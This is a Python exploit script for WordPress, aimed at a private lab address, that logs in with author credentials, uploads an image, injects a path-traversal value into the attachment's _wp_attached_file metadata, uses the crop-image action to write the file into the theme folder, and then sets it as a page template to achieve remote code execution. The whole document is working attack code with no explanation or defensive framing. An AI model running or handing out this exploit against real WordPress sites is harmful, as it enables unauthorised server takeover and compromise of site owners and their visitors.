#!/usr/bin/python3

import requests
import re

url_root='http://172.18.0.5/'
theme='twentynineteen'
current_date='2019/03/'
filename = "gd.jpg"

session = requests.Session()
creds={'log':'author','pwd':'author','wp-submit':'Log In','redirect_to':'{url}wp-admin/'.format(url=url_root),'testcookie':1}
tmp={'wordpress_test_cookie':'WP Cookie check'}
r=session.post(url_root+'wp-login.php',cookies=tmp,data=creds)
wp_init_cookies=session.cookies

#get nonce
response=requests.get('{url}wp-admin/media-new.php'.format(url=url_root),cookies=wp_init_cookies)
_wp_nonce=re.findall(r'name="_wpnonce" value="(\w+)"',response.text)[0]
print(_wp_nonce)
#uploading image
data = {
    'name': 'gd.jpg',
	'action': 'upload-attachment',
    '_wpnonce': _wp_nonce
}
evil = {'async-upload': (filename, open(filename, 'rb'))}
upload_result = requests.post(url_root+'wp-admin/async-upload.php', data=data, files=evil, cookies=wp_init_cookies)
image_id=re.findall(r'{"id":(\d+),',upload_result.text)[0]
update_nonce=re.findall(r'"update":"(\w+)"',upload_result.text)[0]
print(f'Image ID: {image_id}')

#Exploit :changing metadata
response=requests.get(url_root+'wp-admin/post.php?post='+image_id+'&action=edit',cookies=wp_init_cookies)
_wpnonce=re.findall(r'name="_wpnonce" value="(\w+)"',response.text)[0]

data={'_wpnonce':update_nonce,
'action':'editpost',
'post_ID':image_id,
'meta_input[_wp_attached_file]':current_date+filename+'?/../../../../themes/'+theme+'/shell'
}
response=requests.post(url_root+'wp-admin/post.php',data=data, cookies=wp_init_cookies)

#getting ajax nonce
data={'action':'query-attachments','post_id':0,'query[orderby]':'date','query[order]':'DESC','query[posts_per_page]':40,'query[paged]':1}
response=requests.post(url_root+'wp-admin/admin-ajax.php',data=data, cookies=wp_init_cookies)
ajax_nonce=re.findall(r',"edit":"(\w+)"',response.text)[0]
print(f'Ajax nonce: {ajax_nonce}')

#Creating file with wrop-image
data={'action':'crop-image',
'_ajax_nonce':ajax_nonce,
'id':image_id,
'cropDetails[x1]':0,
'cropDetails[y1]':0,
'cropDetails[width]':20,
'cropDetails[height]':20,
'cropDetails[dst_width]':20,
'cropDetails[dst_height]':20}
response=requests.post(url_root+'wp-admin/admin-ajax.php',data=data, cookies=wp_init_cookies)
print(response.text)

#Including into theme
response=requests.post(url_root+'wp-admin/post-new.php', cookies=wp_init_cookies)
_wpnonce=re.findall(r'name="_wpnonce" value="(\w+)"',response.text)[0]
post_id=re.findall(r'"post":{"id":(\w+),',response.text)[0]
print(f'Post ID: {post_id}')

data={'_wpnonce':_wpnonce,
'action':'editpost',
'post_ID':post_id,
'post_title':'wut',
'post_name':'wut',
'meta_input[_wp_page_template]':'cropped-shell.jpg'
}
response=requests.post(url_root+'wp-admin/post.php',data=data, cookies=wp_init_cookies)

print(f'Rce at {url_root}?p={post_id}')
